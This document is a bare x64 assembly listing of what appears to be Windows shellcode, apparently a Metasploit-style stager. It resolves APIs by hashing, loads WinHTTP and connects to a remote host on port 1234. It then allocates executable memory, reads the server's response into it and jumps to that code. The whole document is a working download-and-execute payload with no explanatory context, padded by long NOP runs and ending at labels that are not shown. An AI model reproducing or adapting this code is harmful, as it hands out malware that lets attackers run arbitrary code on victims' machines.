```asm
_start:
    cld
    and rsp, 0xfffffffffffffff0
    call L_d6
RET_a:
    push r9
    push r8
    push rdx
    xor rdx, rdx
    push rcx
    push rsi
    mov rdx, qword ptr gs:[rdx + 0x60]
    mov rdx, qword ptr [rdx + 0x18]
    mov rdx, qword ptr [rdx + 0x20]
L_21:
    movzx rcx, word ptr [rdx + 0x4a]
    xor r9, r9
    mov rsi, qword ptr [rdx + 0x50]
    jmp L_2d
L_2d:
    xor rax, rax
    lodsb al, byte ptr [rsi]
    cmp al, 0x61
    jl L_37
    sub al, 0x20
    jmp L_37
L_37:
    ror r9d, 0xd
    add r9d, eax
    loop L_2d
    push rdx
    mov rdx, qword ptr [rdx + 0x20]
    mov eax, dword ptr [rdx + 0x3c]
    add rax, rdx
    cmp word ptr [rax + 0x18], 0x20b
    push r9
    jne L_cb
    mov eax, dword ptr [rax + 0x88]
    test rax, rax
    je L_cb
    add rax, rdx
    push rax
    mov ecx, dword ptr [rax + 0x18]
    mov r8d, dword ptr [rax + 0x20]
    add r8, rdx
L_72:
    jrcxz L_ca
    xor r9, r9
    dec rcx
    mov esi, dword ptr [r8 + rcx*4]
    add rsi, rdx
    jmp L_81
L_81:
    xor rax, rax
    lodsb al, byte ptr [rsi]
    ror r9d, 0xd
    add r9d, eax
    cmp al, ah
    jne L_81
    add r9, qword ptr [rsp + 8]
    cmp r9d, r10d
    jne L_72
    pop rax
    mov r8d, dword ptr [rax + 0x24]
    add r8, rdx
    mov cx, word ptr [r8 + rcx*2]
    mov r8d, dword ptr [rax + 0x1c]
    add r8, rdx
    mov eax, dword ptr [r8 + rcx*4]
    add rax, rdx
    pop r8
    pop r8
    pop rsi
    pop rcx
    pop rdx
    pop r8
    pop r9
    pop r10
    sub rsp, 0x20
    push r10
    jmp rax
L_ca:
    pop rax
    jmp L_cb
L_cb:
    pop r9
    pop rdx
    mov rdx, qword ptr [rdx]
    jmp L_21
L_3d4:
    pop rax
    push 0
    pop rcx
    mov r10, 0x56a2b5f0
    call rbp
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    jmp L_291
L_291:
    mov rcx, rax
    push rbx
    pop rdx
    pop r8
    mov r13, r8
    add r8, 0x2a
    xor r9, r9
    push rbx
    mov rax, 0x100
    push rax
    push rbx
    push rbx
    mov r10, 0x5bb31098
    call rbp
    mov rsi, rax
    sub rax, 0x20
    mov rdi, rsp
    mov rcx, rdi
    mov r10, 0x600ba721
    call rbp
    test eax, eax
    je L_341
    mov rax, qword ptr [rdi + 8]
    test eax, eax
    je L_316
    mov rcx, rbx
    inc rcx
    shl rcx, 0x20
    push rcx
    push rbx
    push rax
    movabs rax, 0x300000003
    push rax
    mov r8, rsp
    sub rsp, 0x20
    mov rdi, rsp
    mov r9, rdi
    mov rcx, r12
    mov rdx, r13
    mov r10, 0x49eaddda
    call rbp
    test eax, eax
    je L_341
    jmp L_328
L_316:
    mov rax, qword ptr [rdi + 0x10]
    test eax, eax
    je L_341
    add rdi, 8
    push 3
    pop rax
    mov qword ptr [rdi], rax
    jmp L_328
L_328:
    mov r8, rdi
    push 0x18
    pop r9
    mov rcx, rsi
    push 0x26
    pop rdx
    movabs r10, 0xce9d58d3
    call rbp
L_341:
    push 0xa
    pop rdi
    jmp L_344
L_344:
    push rbx
    pop rdx
    mov rcx, rsi
    xor r9, r9
    push rbx
    push rbx
    push rbx
    push rbx
    movabs r10, 0x91bb5895
    call rbp
    test eax, eax
    jne L_36c
    dec rdi
    je L_367
    jmp L_344
L_367:
    call L_3d4
L_36c:
RET_36c:
    mov rcx, rsi
    push rbx
    pop rdx
    mov r10, 0x709d8805
    call rbp
    test eax, eax
    je L_367
    push rbx
    pop rcx
    push 0x40
    pop rdx
    mov r9, rdx
    shl edx, 0x10
    mov r8, 0x1000
    movabs r10, 0xe553a458
    call rbp
    xchg rbx, rax
    push rbx
    push rbx
    mov rdi, rsp
    jmp L_3a3
L_3a3:
    mov rcx, rsi
    mov rdx, rbx
    mov r8, 0x2000
    mov r9, rdi
    mov r10, 0x7e24296c
    call rbp
    add rsp, 0x20
    test eax, eax
    je L_367
    mov ax, word ptr [rdi]
    add rbx, rax
    test eax, eax
    jne L_3a3
    pop rax
    ret
L_d6:
    pop rbp
    xor rbx, rbx
    push rbx
    movabs r14, 0x707474686e6977
    push r14
    mov rcx, rsp
    mov r10, 0x726774c
    call rbp
    push rbx
    push rbx
    mov rcx, rsp
    push rbx
    pop rdx
    xor r8, r8
    xor r9, r9
    push rbx
    push rbx
    movabs r10, 0xbb9d1f04
    call rbp
    mov r12, rax
    lea rdx, [rip + DATA_0]
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    mov rcx, rax
    mov r8, 0x4d2
    xor r9, r9
    movabs r10, 0xc21e9b46
    call rbp
    jmp DATA_STUB_1
```